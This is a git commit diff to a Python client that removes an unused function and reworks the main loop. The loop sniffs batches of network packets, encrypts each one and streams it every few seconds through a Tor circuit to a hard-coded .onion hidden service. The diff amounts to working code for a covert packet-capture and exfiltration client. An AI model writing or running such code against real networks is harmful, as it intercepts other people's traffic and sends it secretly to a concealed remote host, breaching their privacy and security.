8ea03e88ae5871eed79d0a6fa5fdc54d9277538c
Eviatar Butin <eviatar2004@gmail.com>
2021-05-31 07:00:37 -0500

    removed useless function and improved the client

--- client.py
+++ client.py
@@ -7,29 +7,16 @@ from torpy import TorClient
 HOSTNAME = "524jkwd2v5gnigyq.onion"
 PORT = 8080
 
-def talk(self):
-    packets = sniffing.timed_sniff(3)
-    while True:
-        time.sleep(3)
-        
-        packets = sniffing.timed_sniff(1)
-        p = packets[0]
-        p = sniffing.packet_to_bytes(p)
-
-        p = encryption.encrypt(p)
-        
-        self.client_socket.send(p)
-
 with TorClient() as tor:
     with tor.create_circuit(3) as circuit:
         with circuit.create_stream((HOSTNAME,PORT)) as stream:
             while True:
                 time.sleep(3)
         
-                packets = sniffing.packet_sniff(1)
-                p = packets[0]
-                p = sniffing.packet_to_bytes(p)
+                packets = sniffing.packet_sniff(4)
+                for p in packets:
+                    p = sniffing.packet_to_bytes(p)
 
-                p = encryption.encrypt(p)
-                
-                stream.send(p)
+                    p = encryption.encrypt(p)
+                    
+                    stream.send(p)
